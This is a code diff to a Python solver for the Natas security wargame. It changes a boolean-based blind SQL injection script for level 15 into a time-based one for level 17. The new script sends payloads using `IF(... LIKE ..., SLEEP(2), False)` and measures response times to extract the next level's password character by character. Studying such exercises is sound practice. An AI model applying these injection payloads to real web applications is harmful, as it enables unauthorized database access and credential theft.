@@ -1,26 +1,31 @@
+import time
+
 import requests
 
 import utils
 
-LEVEL = 15
+LEVEL = 17
 ASCII_CHARS = utils.ASCII_CHARS
+NEXT_LEVEL = "natas18"
 
 
-def send_payload(session, url, auth, payload):
+def determine_request_time(session, url, auth, payload):
+    start_time = time.time()
     data = {'username': payload}
-    return session.post(url, auth=auth, data=data)
+    session.post(url, auth=auth, data=data)
+    return time.time() - start_time
 
 
 def obtain_password_chars(session, url, auth):
     """ sql injection that determines each character in the password """
     password = ''
     for char in ASCII_CHARS:
-        payload = f'natas16" AND BINARY password LIKE "%{char}%" #'
-        response = send_payload(session, url, auth, payload)
+        payload = f'{NEXT_LEVEL}" AND IF(BINARY password LIKE "%{char}%", SLEEP(2), False) #'
+        elapsed_time = determine_request_time(session, url, auth, payload)
         print(char, end=' ')
-        if 'This user exists' in response.text:
+        if elapsed_time > 1:
             password += char
-            print(f'Found password char {password}')
+            print('password chars: ', password)
     return password
 
 
@@ -32,9 +37,9 @@ def retrieve_password(session, url, auth, password_chars_file):
         password_chars = utils.read_file(password_chars_file)
         for char in password_chars:
             print(char, end=' ')
-            payload = f'natas16" AND BINARY password LIKE \'{password}{char}%\' #'
-            response = send_payload(session, url, auth, payload)
-            if 'This user exists' in response.text:
+            payload = f'{NEXT_LEVEL}" AND IF(BINARY password LIKE "{password + char}%", SLEEP(2), False) #'
+            elapsed_time = determine_request_time(session, url, auth, payload)
+            if elapsed_time > 1:
                 password += char
                 print(f"Current password: {password}")
                 break
